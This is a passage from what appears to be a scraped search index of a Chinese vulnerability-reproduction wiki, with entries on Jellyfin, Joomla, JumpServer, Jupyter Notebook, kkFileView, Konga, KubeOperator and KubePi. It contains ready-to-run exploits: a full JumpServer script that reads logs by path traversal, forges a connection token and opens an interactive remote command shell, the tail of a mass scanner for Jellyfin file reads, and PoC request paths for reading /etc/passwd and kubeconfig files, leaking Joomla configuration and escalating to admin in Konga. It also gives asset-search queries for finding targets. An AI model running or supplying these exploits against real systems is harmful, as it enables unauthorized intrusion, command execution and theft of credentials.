\"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] 目标 {} 存在漏洞(读取 windows/win.ini), 链接为:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] 请求报错 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile \u003e\u003e\u003e \\033[0m\")) Scan(file_name) ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:5:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"Joomla application 未授权访问漏洞 CVE-2023-23752 ","date":"0001-01-01","objectID":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/:0:0","tags":null,"title":"","uri":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/"},{"categories":null,"content":"漏洞描述 Joomla 存在未授权访问漏洞，攻击者通过覆盖 public 值绕过限制，访问部分API获取敏感数据 ","date":"0001-01-01","objectID":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/:1:0","tags":null,"title":"","uri":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/"},{"categories":null,"content":"漏洞影响 Joomla 4.0.0 - 4.2.7 ","date":"0001-01-01","objectID":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/:2:0","tags":null,"title":"","uri":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/"},{"categories":null,"content":"网络测绘 app=\"Joomla\" ","date":"0001-01-01","objectID":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/:3:0","tags":null,"title":"","uri":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /api/index.php/v1/config/application?public=true ","date":"0001-01-01","objectID":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/:4:0","tags":null,"title":"","uri":"/joomla-application-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-23752/"},{"categories":null,"content":"JumpServer 未授权接口 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取到日志文件获取敏感信息，或者执行相关API操作控制其中所有机器。 ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 JumpServer \u003c v2.6.2 JumpServer \u003c v2.5.4 JumpServer \u003c v2.4.5 JumpServer = v1.5.9 ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"FIT2CLOUD-JumpServer-堡垒机\" ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 安装 JumpServer v2.6.1 版本 下载链接 安装注意 配置网络，配置Mysql，配置Redis 选择 n 等待完成安装执行以下命令 cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start 等待安装完毕访问 http://xxx.xxx.xxx.xxxx:8080 默认账号密码 amdin:admin ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 进入后台添加配置 资产管理 –\u003e 系统用户 资产管理 –\u003e 管理用户 用户管理 –\u003e 用户列表 资产管理 –\u003e 资产列表 查看一下项目代码提交变动 import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger(__name__) class CeleryLogWebsocket(JsonWebsocketConsumer): disconnected = False def connect(self): user = self.scope[\"user\"] if user.is_authenticated and user.is_org_admin: self.accept() else: self.close() def receive(self, text_data=None, bytes_data=None, **kwargs): data = json.loads(text_data) task_id = data.get(\"task\") if task_id: self.handle_task(task_id) def wait_util_log_path_exist(self, task_id): log_path = get_celery_task_log_path(task_id) while not self.disconnected: if not os.path.exists(log_path): self.send_json({'message': '.', 'task': task_id}) time.sleep(0.5) continue self.send_json({'message': '\\r\\n'}) try: logger.debug('Task log path: {}'.format(log_path)) task_log_f = open(log_path, 'rb') return task_log_f except OSError: return None def read_log_file(self, task_id): task_log_f = self.wait_util_log_path_exist(task_id) if not task_log_f: logger.debug('Task log file is None: {}'.format(task_id)) return task_end_mark = [] while not self.disconnected: data = task_log_f.read(4096) if data: data = data.replace(b'\\n', b'\\r\\n') self.send_json( {'message': data.decode(errors='ignore'), 'task': task_id} ) if data.find(b'succeeded in') != -1: task_end_mark.append(1) if data.find(bytes(task_id, 'utf8')) != -1: task_end_mark.append(1) elif len(task_end_mark) == 2: logger.debug('Task log end: {}'.format(task_id)) break time.sleep(0.2) task_log_f.close() def handle_task(self, task_id): logger.info(\"Task id: {}\".format(task_id)) thread = threading.Thread(target=self.read_log_file, args=(task_id,)) thread.start() def disconnect(self, close_code): self.disconnected = True self.close() 新版对用户进行了一个判断，可以使用 谷歌插件 WebSocket King 连接上这个websocket 进行日志读取 比如send这里获取的 Task id ,这里是可以获得一些敏感的信息的 查看一下连接Web终端的后端api代码 可以看到这里调用时必须需要 user asset system_user 这三个值，再获取一个20秒的 token 访问web终端后查看日志的调用 docker exec -it (jumpserve/core的docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 可以看到在不同的时间访问这个接口的asset_id等都是一样的，所以只用在 刚刚的未授权日志读取里找到想要的这几个值就可以获得 token 发送请求获取20s的token 看一下 koko.js 这个前端文件 后端代码 https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go 这里我们就可以通过 获得的token来模拟请求 成功连接模拟了这个 token 的请求,可以在Network看一下流量是怎么发送的 模拟连接发送和接发数据 这里可以看到我们只要模拟了这个发送，返回的数据和web终端是一样的，那我们就可以通过这样的方法来进行命令执行了 ","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC ✅POC 里包含两个方法，一个是获取日志文件，另一个是命令执行 ✅日志提取已经过滤了部分API调用的数据，只需要找到那几个值就好了 ✅命令执行需要从日志中获取敏感数据并写入脚本对应的变量中 ✅接收数据如果卡住请调整 for i in range(7) 这个位置的 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mPOC_Des: https://www.o2oxy.cn/ \\033[0m') print('+ \\033[34mVersion: JumpServer \u003c= v2.6.1 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') class ws_long(WebSocketClient): def opened(self): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self.send(req) def closed(self, code, reason=None): print(\"Closed down:\", code, reason) def received_message(self, resp): resp = json.loads(str(resp)) # print(resp) data = resp['message'] print(data) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data: print(data) async def send_msg(websocket, _text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) async def main_logic(target_url): print(\"\\033[32m[o] 正在连接目标: {}\\033[0m\".format(target_url)) async with websockets.connect(target_url) as websocket: recv_text = await websocket.recv() resws = json.loads(recv_text) id = resws['id'] print(\"\\033[36m[o] 成功获取 ID: {}\\033[0m\".format(id)) inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket, inittext) for i in range(7): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) while True: cmd = str(input(\"\\033[35mcmd \u003e\u003e\u003e \\033[0m\")) cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd + \"\\r\\n\"}) await send_msg(websocket, cmdtext) for i in range(1): recv_text = await websocket.recv() print(re.findall(r'\"data\":\"(.*?)\"', recv_text)) def POC_1(target_url): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests.get(url=vuln_url, timeout=5) print(response.status_code) ws_open = str(input(\"\\033[32m[o] 是否想要提取日志（Y/N） \u003e\u003e\u003e \\033[0m\")) try: if ws_open == \"Y\" or ws_open == \"y\": ws = target_url.strip(\"http://\") try: ws = ws_long('ws://{}/ws/ops/tasks/log/'.format(ws)) ws.connect() ws.run_forever() ws.close() except KeyboardInterrupt: ws.close() else: print(\"\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞已修复，无法获取敏感日志信息,{}\\033[0m\".format(e)) sys.exit(0) def POC_2(target_url, user, asset, system_user): if target_url == \"\" or asset == \"\" or system_user == \"\": print(\"\\033[31m[x] 请获取 assset 等参数配置\\033[0m\") sys.exit(0) data = {\"user\": user, \"asset\": asset, \"system_user\": system_user} vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try: response = requests.post(vuln_url, json=data, timeout=5).json() print(\"\\033[32m[o] 正在请求：{}\\033[0m\".format(vuln_url)) token = response['token'] print(\"\\033[36m[o] 成功获取Token：{}\\033[0m\".format(token)) ws_url = target_url.strip(\"http://\") ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id={}\".format(token) asyncio.get_event_loop().run_until_complete(main_logic(ws_url)) except Exception as e: print(\"\\033[31m[x] 请检查 assset 等参数配置,{}\\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1(target_url) POC_2(","date":"0001-01-01","objectID":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:6:0","tags":null,"title":"","uri":"/jumpserver-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Jupyter Notebook 未授权访问远程命令执行漏洞 ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。 如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Jupyter Notebook ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"Jupyter-Notebook\" \u0026\u0026 body=\"Terminal\" ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 Vulhub运行测试环境： docker-compose up -d 运行后，访问http://your-ip:8888将看到Jupyter Notebook的Web管理界面，并没有要求填写密码。 ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问目标, 点击new→Terminal即可创建一个控制台，可以直接执行任意命令： 执行命令并反弹shell： 监听2333端口，成功接收反弹shell： ","date":"0001-01-01","objectID":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/jupyter-notebook-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"kkFileView getCorsFile 任意文件读取漏洞 CVE-2021-43734 ","date":"0001-01-01","objectID":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/:0:0","tags":null,"title":"","uri":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/"},{"categories":null,"content":"漏洞描述 kkFileView getCorsFile 3.6.0 版本以下存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的任意文件，获取服务器敏感信息 ","date":"0001-01-01","objectID":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/:1:0","tags":null,"title":"","uri":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/"},{"categories":null,"content":"漏洞影响 kkFileView getCorsFile \u003c= 3.6.0 ","date":"0001-01-01","objectID":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/:2:0","tags":null,"title":"","uri":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/"},{"categories":null,"content":"网络测绘 body=\"kkFileView\" ","date":"0001-01-01","objectID":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/:3:0","tags":null,"title":"","uri":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /getCorsFile?urlPath=file:///etc/passwd ","date":"0001-01-01","objectID":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/:4:0","tags":null,"title":"","uri":"/kkfileview-getcorsfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43734/"},{"categories":null,"content":"Konga 普通用户越权获取管理员权限漏洞 ","date":"0001-01-01","objectID":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Konga 普通用户通过发送特殊的请求可越权获取管理员权限 ","date":"0001-01-01","objectID":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Konga ","date":"0001-01-01","objectID":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"konga\" ","date":"0001-01-01","objectID":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 创建非管理员用户后登录并获取token 发送请求包, 将token修改为刚刚获取的 PUT /api/user/7 HTTP/1.1 Host: 127.0.0.1:1337 Accept: application/json, text/plain, */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json;charset=utf-8 Content-Length: 241 { \"admin\": true, \"passports\": { \"password\": \"1234abcd\", \"protocol\": \"local\" }, \"password_confirmation\": \"1234abcd\", \"token\": \"non-administrator user token\" } 成功转为管理员用户 ","date":"0001-01-01","objectID":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/konga-%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E8%B6%8A%E6%9D%83%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"KubeOperator kubeconfig 未授权访问漏洞 CVE-2023-22480 ","date":"0001-01-01","objectID":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/:0:0","tags":null,"title":"","uri":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/"},{"categories":null,"content":"漏洞描述 KubeOperator 是一个开源的轻量级 Kubernetes 发行版，专注于帮助企业规划、部署和运营生产级别的 Kubernetes 集群。CVE-2023-22480 中，由于下载kubeconfig的路径不需要身份认证，导致攻击者可直接下载kubeconfig获取相关敏感信息。 ","date":"0001-01-01","objectID":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/:1:0","tags":null,"title":"","uri":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/"},{"categories":null,"content":"漏洞影响 KubeOperator \u003c 3.16.4 ","date":"0001-01-01","objectID":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/:2:0","tags":null,"title":"","uri":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/"},{"categories":null,"content":"网络测绘 app=\"KubeOperator\" ","date":"0001-01-01","objectID":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/:3:0","tags":null,"title":"","uri":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/"},{"categories":null,"content":"漏洞复现 登陆页面 在补丁中修复了配置文件下载接口的未授权 当集群存在时可通过接口未授权下载配置文件 验证POC (k8s为集群名称，不固定) /api/v1/clusters/kubeconfig/k8s ","date":"0001-01-01","objectID":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/:4:0","tags":null,"title":"","uri":"/kubeoperator-kubeconfig-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2023-22480/"},{"categories":null,"content":"KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463 ","date":"0001-01-01","objectID":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/:0:0","tags":null,"title":"","uri":"/kubepi-jwtsigkey-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2023-22463/"},{"categories":null,"content":"漏洞描述 KubePi 是一个现代化的 K8s 面板。KubePi 允许管理员导入多个 Kubernetes 集群，并且通过权限控制，将不同 cluster、namespace 的权限分配给指定用户。它允许开发人员管理 Kubernetes 集群中运行的应用程序并对其进行故障排查，供开发人员更好地处理 